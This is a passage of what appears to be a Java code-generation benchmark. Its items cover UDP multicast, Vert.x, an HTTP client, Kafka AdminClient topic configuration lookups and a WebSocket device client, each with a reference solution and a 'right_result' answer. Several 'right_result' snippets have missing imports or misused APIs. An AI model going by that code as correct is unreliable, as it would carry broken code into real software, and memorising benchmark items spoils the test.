    "Instruction": "Task Description: Implement a Java class for multicast UDP communication using Java NIO's DatagramChannel for both sending and receiving messages in a non-blocking manner.\n\nClass Description: The MulticastUDP class provides functionality for joining a multicast group, sending messages to specified targets, receiving messages from the group, and closing the communication channel. It utilizes Java NIO's non-blocking capabilities for efficient UDP communication.\n\nAttributes:\n- channel: DatagramChannel - The NIO channel used for UDP communication  \n- group: InetAddress - The multicast group address  \n- port: int - The port number for multicast communication  \n\nMethods:\n- MulticastUDP(String host, int port) -> void - Constructor that initializes the multicast group address and port, and opens a DatagramChannel  \n- joinGroup() -> void - Binds the channel to the specified port and joins the multicast group  \n- receive() -> String - Receives a message from the multicast group and returns it as a String  \n- send(String message, String targetHost, int targetPort) -> void - Sends a message to a specified target host and port  \n- close() -> void - Closes the DatagramChannel to release resources",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.StandardProtocolFamily;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic final class MulticastUDP {\n\n    private DatagramChannel channel;\n    private InetAddress group;\n    private int port;\n\n    public MulticastUDP(String host, int port) throws Exception {\n        this.group = InetAddress.getByName(host);\n        this.port = port;\n        this.channel = DatagramChannel.open(StandardProtocolFamily.INET);\n    }\n\n    public void joinGroup() throws Exception {\n        channel.bind(new InetSocketAddress(port));\n        channel.join(group, Utils.getLocalNetworkInterface());\n    }\n\n    public String receive() throws Exception {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        SocketAddress sender = channel.receive(buffer);\n        buffer.flip();\n        byte[] data = new byte[buffer.remaining()];\n        buffer.get(data);\n        return new String(data);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        channel.configureBlocking(true);\n        InetSocketAddress sender = new InetSocketAddress(targetHost, targetPort);\n        channel.send(ByteBuffer.wrap(message.getBytes()), sender);\n    }\n\n    public void close() throws Exception {\n        channel.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.util.Iterator;\n\npublic class MulticastUDP {\n    private DatagramChannel channel;\n    private InetAddress group;\n    private int port;\n\n    public MulticastUDP(String host, int port) throws IOException {\n        this.group = InetAddress.getByName(host);\n        this.port = port;\n        this.channel = DatagramChannel.open();\n        this.channel.configureBlocking(false);\n    }\n\n    public void joinGroup() throws IOException {\n        channel.socket().setBroadcast(true);\n        channel.join(group, channel.socket().getLocalAddress());\n    }\n\n    public String receive() throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        channel.receive(buffer);\n        buffer.flip();\n        byte[] data = new byte[buffer.remaining()];\n        buffer.get(data);\n        return new String(data);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws IOException {\n        InetAddress target = InetAddress.getByName(targetHost);\n        ByteBuffer buffer = ByteBuffer.wrap(message.getBytes());\n        channel.send(buffer, target, port);\n    }\n\n    public void close() throws IOException {\n        channel.close();\n    }\n}\n```"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for interacting with a radio scanner API, supporting both synchronous and asynchronous requests.\n\nClass Description: The RdioScannerHttpClient class provides methods to test API connections and send audio recordings to a radio scanner service using HTTP multipart form data requests. It uses Java's HttpClient for HTTP/2 communication with configurable timeouts and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection]([RdioScannerConfiguration configuration]) -> [String] - Synchronously tests the API connection by sending a test request with the API key and system ID, returns the response body with status code or error message\n- sendAudioRecordingAsync: [sendAudioRecordingAsync]([RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder]) -> [void] - Asynchronously sends an audio recording to the API using multipart form data, handles response completion with success/error callbacks",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class RdioScannerHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(RdioScannerConfiguration configuration) {\n        RdioScannerBuilder bodyBuilder = new RdioScannerBuilder();\n        bodyBuilder.addPart(FormField.KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder) {\n        HttpRequest fileRequest = HttpRequest.newBuilder()\n            .uri(URI.create(config.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        mHttpClient.sendAsync(fileRequest, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((fileResponse, throwable1) -> {\n                if(throwable1 != null || fileResponse.statusCode() != 200) {\n                    if(throwable1 instanceof IOException || throwable1 instanceof CompletionException) {\n                        // Handle error cases\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class RdioScannerHttpClient {\n    private final HttpClient mHttpClient;\n\n    public RdioScannerHttpClient() {\n        this.mHttpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_2)\n                .connectTimeout(Duration.ofSeconds(20))\n                .followRedirects(HttpClient.Redirect.NORMAL)\n                .build();\n    }\n\n    public String testConnection(RdioScannerConfiguration configuration) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(new URI(configuration.getTestUrl()))\n                .header(\"Authorization\", \"Bearer \" + configuration.getApiKey())\n                .GET()\n                .build();\n\n        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        return response.body();\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(new URI(config.getUploadUrl()))\n                .header(\"Authorization\", \"Bearer \" + config.getApiKey())\n                .POST(bodyBuilder.buildMultipartFormData())\n                .build();\n\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n                .thenAccept(response -> {\n                    if (response.statusCode() == 200) {\n                        System.out.println(\"Audio recording sent successfully.\");\n                    } else {\n                        System.err.println(\"Failed to send audio recording: \" + response.body());\n                    }\n                });\n    }\n}\n```"
  },
  {
    "Task_id": 452,
    "Instruction": "Task Description: Create a Java class that implements UDP communication using Vert.x, allowing for the initialization of a UDP socket, sending UDP packets, and closing the socket.\n\nClass Description: The UdpSender class provides functionality for sending UDP packets using Vert.x's DatagramSocket. It supports socket configuration, packet transmission, and socket cleanup.\n\nAttributes:\n\nAttribute1: socket [DatagramSocket] - The Vert.x DatagramSocket instance used for UDP communication.\nAttribute2: vertx [Vertx] - The Vert.x instance used to create the DatagramSocket.\n\nMethods:\n\nMethod1: initialize(DatagramSocketOptions options) -> void - Initializes the UDP socket with the specified configuration options.\nMethod2: sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) -> void - Sends a UDP packet containing the specified data to the given host and port, with an optional handler to track the send operation's success or failure.\nMethod3: close(Handler<AsyncResult<Void>> closeHandler) -> void - Closes the UDP socket, with an optional handler to track the close operation's completion.",
    "Canonical_solution": "import io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic class UdpSender {\n\n    private DatagramSocket socket;\n    private Vertx vertx;\n\n    public UdpSender(Vertx vertx) {\n        this.vertx = vertx;\n    }\n\n    public void initialize(DatagramSocketOptions options) {\n        socket = vertx.createDatagramSocket(options);\n    }\n\n    public void sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) {\n        socket.send(data, port, host).onComplete(resultHandler);\n    }\n\n    public void close(Handler<AsyncResult<Void>> closeHandler) {\n        if (socket != null) {\n            socket.close().onComplete(closeHandler);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 14,
    "right_result": "```java\nimport io.vertx.core.AbstractVerticle;\nimport io.vertx.core.AsyncResult;\nimport io.vertx.core.Handler;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic class UdpSender extends AbstractVerticle {\n    private DatagramSocket socket;\n    private Vertx vertx;\n\n    @Override\n    public void start() {\n        vertx = this.vertx;\n    }\n\n    public void initialize(DatagramSocketOptions options) {\n        socket = vertx.createDatagramSocket(options);\n    }\n\n    public void sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) {\n        socket.send(data, port, host, resultHandler);\n    }\n\n    public void close(Handler<AsyncResult<Void>> closeHandler) {\n        if (socket != null) {\n            socket.close(closeHandler);\n        } else {\n            closeHandler.handle(Future.failedFuture(\"Socket is already closed\"));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 454,
    "Instruction": "Task Description: Retrieve the configurations of specified Kafka topics using the Kafka AdminClient API.\n\nFunction Description: This function connects to a Kafka cluster using the provided bootstrap servers and retrieves the configurations for the specified topic names. It utilizes the Kafka AdminClient to describe the configurations and returns them as a map of ConfigResource to Config objects.\n\nInput: \n- bootstrapServers: [String] - Comma-separated list of host/port pairs to use for establishing the initial connection to the Kafka cluster.\n- topicNames: [String[]] - Array of topic names for which configurations need to be retrieved.\n\nOutput: \n- [Map<ConfigResource, Config>] - A map where keys are ConfigResource objects representing the topics, and values are Config objects containing the configuration entries for each topic. The operation will timeout after 3 seconds if the configuration retrieval is not completed.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\n\npublic Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) throws Exception {\n    Map<String, Object> adminClientConfig = new HashMap<>();\n    adminClientConfig.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminClientConfig);\n    \n    ConfigResource[] configResources = Arrays.stream(topicNames)\n        .map(topicName -> new ConfigResource(ConfigResource.Type.TOPIC, topicName))\n        .toArray(ConfigResource[]::new);\n        \n    DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(Arrays.asList(configResources));\n    return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 36,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class KafkaTopicConfigRetriever {\n\n    public static Map<ConfigResource, Config> getTopicConfigs(String bootstrapServers, String[] topicNames) throws Exception {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        try (AdminClient adminClient = AdminClient.create(props)) {\n            List<String> topicList = Arrays.asList(topicNames);\n            DescribeConfigsResult result = adminClient.describeConfigs(\n                    topicList.stream().map(name -> new ConfigResource(ConfigResource.Type.TOPIC, name)).collect(Collectors.toList())\n            );\n            return result.all().get(3, TimeUnit.SECONDS);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            String bootstrapServers = \"localhost:9092\";\n            String[] topicNames = {\"topic1\", \"topic2\"};\n            Map<ConfigResource, Config> configs = getTopicConfigs(bootstrapServers, topicNames);\n            System.out.println(configs);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 455,
    "Instruction": "Task Description: Write a function that retrieves the configuration details of specified Kafka topics using the Kafka AdminClient API.\n\nFunction Description: The function connects to a Kafka cluster using the provided bootstrap servers, then fetches and returns the configuration details for each specified topic name. It utilizes Kafka's AdminClient to describe topic configurations and returns them as a map of ConfigResource to Config objects.\n\nInput: \n- bootstrapServers: [String] - Comma-separated list of host:port pairs for establishing the initial connection to the Kafka cluster\n- topicNames: [String[]] - Array of topic names whose configurations need to be retrieved\n\nOutput: \n- Returns [Map<ConfigResource, Config>] - A map where keys are ConfigResource objects representing the topics, and values are Config objects containing the configuration details for each topic\n- Throws [Exception] - If there's any error during the configuration retrieval process or if the operation times out",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\n\npublic Map<ConfigResource, Config> getKafkaTopicConfigs(String bootstrapServers, String[] topicNames) throws Exception {\n    Map<String, Object> adminClientConfig = new HashMap<>();\n    adminClientConfig.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminClientConfig);\n    \n    ConfigResource[] configResources = Arrays.stream(topicNames)\n        .map(topicName -> new ConfigResource(ConfigResource.Type.TOPIC, topicName))\n        .toArray(ConfigResource[]::new);\n        \n    DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(Arrays.asList(configResources));\n    return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 36,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class KafkaTopicConfigFetcher {\n\n    public static Map<ConfigResource, Config> getTopicConfigs(String bootstrapServers, String[] topicNames) throws Exception {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        \n        try (AdminClient adminClient = AdminClient.create(props)) {\n            List<String> configsToDescribe = Arrays.asList(topicNames);\n            DescribeConfigsResult result = adminClient.describeConfigs(configsToDescribe.stream()\n                    .map(topic -> new ConfigResource(ConfigResource.Type.TOPIC, topic))\n                    .collect(Collectors.toList()));\n            \n            return result.all().get();\n        }\n    }\n\n    // Example usage\n    public static void main(String[] args) {\n        try {\n            Map<ConfigResource, Config> configs = getTopicConfigs(\"localhost:9092\", new String[]{\"my-topic\"});\n            System.out.println(configs);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a Java class that provides administrative operations for Kafka topics, including retrieving configurations for individual topics, multiple topics, and all topics in a Kafka cluster.\n\nClass Description: The KafkaAdminTopicConfigProvider class is designed to interact with Kafka's AdminClient to perform topic configuration operations. It provides methods to fetch topic configurations either for a single topic, a set of topics, or all topics in the cluster. The class handles timeouts and errors gracefully and converts Kafka Config objects into standard Java Properties objects.\n\nAttributes:\n- _clusterConfigs: [Properties] - Stores configuration properties for the Kafka cluster\n- _adminClient: [AdminClient] - The Kafka AdminClient instance used to perform administrative operations\n- DESCRIBE_CLUSTER_CONFIGS_TIMEOUT: [Duration] - Constant defining the timeout duration for describeConfigs operations (90 seconds)\n- LOG: [Logger] - Logger instance for logging debug and warning messages\n\nMethods:\n- topicConfigs: [String topic] -> [Properties] - Retrieves configuration properties for a single specified topic. Returns empty Properties if retrieval fails.\n- topicConfigs: [Set<String> topics] -> [Map<String, Properties>] - Retrieves configurations for multiple topics specified in the input set. Returns a map of topic names to their configurations.\n- allTopicConfigs: [] -> [Map<String, Properties>] - Retrieves configurations for all topics in the Kafka cluster. Returns an empty map if retrieval fails.\n- convertConfigToProperties: [Config config] -> [Properties] - Helper method that converts a Kafka Config object into a Java Properties object, filtering out null entries.",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.Set;\nimport java.util.concurrent.ExecutionException;\nimport java.util.stream.Collectors;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.ConfigEntry;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.protocol.Errors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class KafkaAdminTopicConfigProvider {\n  private static final Logger LOG = LoggerFactory.getLogger(KafkaAdminTopicConfigProvider.class);\n  public static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n  protected Properties _clusterConfigs;\n  protected AdminClient _adminClient;\n\n  public Properties topicConfigs(String topic) {\n    Config topicConfig = null;\n    ConfigResource topicResource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n    try {\n      LOG.debug(\"Requesting details for topic '{}'\", topic);\n      topicConfig = _adminClient\n              .describeConfigs(Collections.singletonList(topicResource))\n              .all()\n              .get()\n              .get(topicResource);\n    } catch (ExecutionException ee) {\n      if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n        LOG.warn(\"Failed to retrieve configuration for topic '{}' due to describeConfigs request time out.\", topic);\n      } else {\n        LOG.warn(\"Cannot retrieve configuration for topic '{}'.\", topic, ee);\n      }\n    } catch (InterruptedException ie) {\n      LOG.debug(\"Interrupted while getting configuration for topic '{}'.\", topic, ie);\n    }\n\n    if (topicConfig != null) {\n      return convertConfigToProperties(topicConfig);\n    } else {\n      LOG.warn(\"The configuration for topic '{}' could not be retrieved, returning empty Properties instance.\", topic);\n      return new Properties();\n    }\n  }\n\n  public Map<String, Properties> topicConfigs(Set<String> topics) {\n    Map<ConfigResource, KafkaFuture<Config>> topicConfigs;\n    topicConfigs = _adminClient.describeConfigs(\n            topics.stream().map(name -> new ConfigResource(ConfigResource.Type.TOPIC, name)).collect(Collectors.toList())\n    ).values();\n\n    Map<String, Properties> propsMap = new HashMap<>();\n    if (topicConfigs != null) {\n      for (Map.Entry<ConfigResource, KafkaFuture<Config>> entry : topicConfigs.entrySet()) {\n        try {\n          Config config = entry.getValue().get();\n          propsMap.put(entry.getKey().name(), convertConfigToProperties(config));\n        } catch (ExecutionException ee) {\n          if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n            LOG.warn(\"Failed to retrieve config for topics due to describeConfigs request timing out.\");\n            break;\n          } else {\n            LOG.debug(\"Cannot retrieve config for topic {}.\", entry.getKey().name(), ee);\n          }\n        } catch (InterruptedException ie) {\n          LOG.debug(\"Interrupted while getting config for topic {}.\", entry.getKey().name(), ie);\n        }\n      }\n    }\n    return propsMap;\n  }\n\n  public Map<String, Properties> allTopicConfigs() {\n    LOG.debug(\"Requesting configurations for all topics\");\n    Set<String> topicNames = null;\n    try {\n      topicNames = _adminClient.listTopics().names().get();\n    } catch (InterruptedException | ExecutionException e) {\n      LOG.warn(\"Unable to obtain list of all topic names from the Kafka Cluster\");\n    }\n\n    if (topicNames == null) {\n      return Collections.emptyMap();\n    } else {\n      return topicConfigs(topicNames);\n    }\n  }\n\n  protected static Properties convertConfigToProperties(Config config) {\n    Properties props = new Properties();\n    for (ConfigEntry entry : config.entries()) {\n      if (entry.name() == null || entry.value() == null) {\n        continue;\n      }\n      props.put(entry.name(), entry.value());\n    }\n    return props;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.time.Duration;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\nimport java.util.logging.Logger;\n\npublic class KafkaAdminTopicConfigProvider {\n    private final Properties _clusterConfigs;\n    private final AdminClient _adminClient;\n    public static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n    private static final Logger LOG = Logger.getLogger(KafkaAdminTopicConfigProvider.class.getName());\n\n    public KafkaAdminTopicConfigProvider(Properties clusterConfigs, AdminClient adminClient) {\n        this._clusterConfigs = clusterConfigs;\n        this._adminClient = adminClient;\n    }\n\n    public Properties topicConfigs(String topic) {\n        try {\n            DescribeConfigsResult result = _adminClient.describeConfigs(Collections.singletonMap(topic, Collections.emptyMap()));\n            return convertConfigToProperties(result.values().get(topic).all());\n        } catch (InterruptedException | ExecutionException e) {\n            LOG.warning(\"Failed to retrieve topic configs for \" + topic + \": \" + e.getMessage());\n            Thread.currentThread().interrupt();\n            return new Properties();\n        }\n    }\n\n    public Map<String, Properties> topicConfigs(Set<String> topics) {\n        Map<String, Properties> configs = new HashMap<>();\n        try {\n            DescribeConfigsResult result = _adminClient.describeConfigs(topics.stream()\n                    .collect(Collectors.toMap(topic -> topic, t -> Collections.emptyMap())));\n            result.all().get().forEach((topic, config) -> configs.put(topic, convertConfigToProperties(config)));\n        } catch (InterruptedException | ExecutionException e) {\n            LOG.warning(\"Failed to retrieve topic configs for \" + topics + \": \" + e.getMessage());\n            Thread.currentThread().interrupt();\n        }\n        return configs;\n    }\n\n    public Map<String, Properties> allTopicConfigs() {\n        Map<String, Properties> configs = new HashMap<>();\n        try {\n            DescribeClusterResult clusterResult = _adminClient.describeCluster();\n            ListTopicsResult topicsResult = _adminClient.listTopics();\n            Set<String> topicNames = topicsResult.names().get();\n            DescribeConfigsResult result = _adminClient.describeConfigs(topicNames.stream()\n                    .collect(Collectors.toMap(topic -> topic, t -> Collections.emptyMap())));\n            result.all().get().forEach((topic, config) -> configs.put(topic, convertConfigToProperties(config)));\n        } catch (InterruptedException | ExecutionException e) {\n            LOG.warning(\"Failed to retrieve all topic configs: \" + e.getMessage());\n            Thread.currentThread().interrupt();\n        }\n        return configs;\n    }\n\n    private Properties convertConfigToProperties(Config config) {\n        Properties props = new Properties();\n        for (ConfigEntry entry : config.entries()) {\n            if (entry.value() != null) {\n                props.setProperty(entry.name(), entry.value());\n            }\n        }\n        return props;\n    }\n}\n```"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Implement a Kafka topic administration utility class that provides functionality to describe Kafka topics using the AdminClient API.\n\nClass Description: The `KafkaTopicAdmin` class is a utility class designed to interact with Apache Kafka's administrative API. It provides methods to perform administrative operations on Kafka topics, specifically focusing on describing topic configurations. The class handles connection management and timeout configurations for administrative operations.\n\nAttributes:\n- configs: [Map<String, Object>] - Configuration properties for connecting to the Kafka cluster (e.g., bootstrap servers, security settings)\n- operationTimeout: [int] - Timeout duration in seconds for administrative operations\n\nMethods:\n- describeTopics: [describeTopics](String... topicNames) -> Map<String, TopicDescription> - Describes the specified Kafka topics by returning their configurations including partition count, replication factor, and other metadata. Throws KafkaException for operation failures or interruptions.\n- createAdmin: [createAdmin]() -> Admin - Creates and returns an AdminClient instance using the configured properties. Protected method for internal use.\n- getAdminConfig: [getAdminConfig]() -> Map<String, Object> - Returns a copy of the admin client configuration. Protected method for internal use.\n\nThe class implements AutoCloseable behavior through the AdminClient resource management in the describeTopics method, ensuring proper cleanup of resources. It handles various failure scenarios including timeouts, execution exceptions, and thread interruptions by wrapping them in appropriate KafkaException instances.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.Admin;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.springframework.kafka.KafkaException;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaTopicAdmin {\n\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        try (Admin admin = createAdmin()) {\n            Map<String, TopicDescription> results = new HashMap<>();\n            DescribeTopicsResult topics = admin.describeTopics(Arrays.asList(topicNames));\n            try {\n                results.putAll(topics.allTopicNames().get(this.operationTimeout, TimeUnit.SECONDS));\n                return results;\n            }\n            catch (InterruptedException ie) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted while getting topic descriptions\", ie);\n            }\n            catch (TimeoutException | ExecutionException ex) {\n                throw new KafkaException(\"Failed to obtain topic descriptions\", ex);\n            }\n        }\n    }\n\n    protected Admin createAdmin() {\n        return AdminClient.create(getAdminConfig());\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        final Map<String, Object> configs2 = new HashMap<>(this.configs);\n        return configs2;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\nimport java.util.stream.Collectors;\n\npublic class KafkaTopicAdmin implements AutoCloseable {\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n        this.configs.put(AdminClientConfig.REQUEST_TIMEOUT_MS_CONFIG, operationTimeout * 1000);\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) throws KafkaException {\n        try (Admin admin = createAdmin()) {\n            DescribeTopicsResult result = admin.describeTopics(Arrays.asList(topicNames));\n            return result.all().get(operationTimeout, TimeUnit.SECONDS).entrySet().stream()\n                    .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue));\n        } catch (InterruptedException | ExecutionException e) {\n            throw new KafkaException(\"Failed to describe topics\", e);\n        }\n    }\n\n    protected Admin createAdmin() {\n        return AdminClient.create(configs);\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        return new HashMap<>(configs);\n    }\n\n    @Override\n    public void close() throws Exception {\n        // No-op as AdminClient is managed within describeTopics method\n    }\n}\n```"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket client class for handling device management operations in a cross-platform environment (Android/iOS), including device occupation, release, and various debug operations.\n\nClass Description: TransportClient is a WebSocket client implementation that handles communication with a device management server. It manages device resources, processes incoming commands, and coordinates debug sessions for both Android and iOS devices.\n\nAttributes:\n- Inherited from WebSocketClient: Basic WebSocket connection attributes (URI, connection state, etc.)\n- No additional attributes declared (uses inherited functionality)\n\nMethods:\n1. TransportClient(URI serverUri) -> void - Constructor that initializes the WebSocket client with the server URI.\n\n2. onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Logs connection status.\n\n3. onMessage(String s) -> void - Handles incoming messages from server. Parses JSON messages and delegates to appropriate handler methods based on message type. Runs handlers in a thread pool.\n\n4. onClose(int i, String s, boolean b) -> void - Callback when connection closes. Handles cleanup and reconnection logic.\n\n5. onError(Exception e) -> void - Callback for connection errors. Logs error messages.\n\n6. handleOccupyMessage(JSONObject jsonObject) -> void - Processes device occupation requests. Locks device and initiates platform-specific debug setup.\n   - Input: JSONObject containing device info and debug parameters\n   - Output: None (side effects: device lock, debug session setup)\n\n7. handleAndroidOccupy(String udId, JSONObject jsonObject) -> void - Android-specific occupation handler. Starts debug session and required services.\n   - Input: \n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: Android debug session setup)\n\n8. handleIOSOccupy(String udId, JSONObject jsonObject) -> void - iOS-specific occupation handler. Starts debug session and required services.\n   - Input:\n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: iOS debug session setup)\n\n(Note: The class contains additional private handler methods for other message types that follow similar patterns to handleOccupyMessage, but they are not fully shown in the reference code. These would include handlers for release, debug steps, suite operations, etc.)",
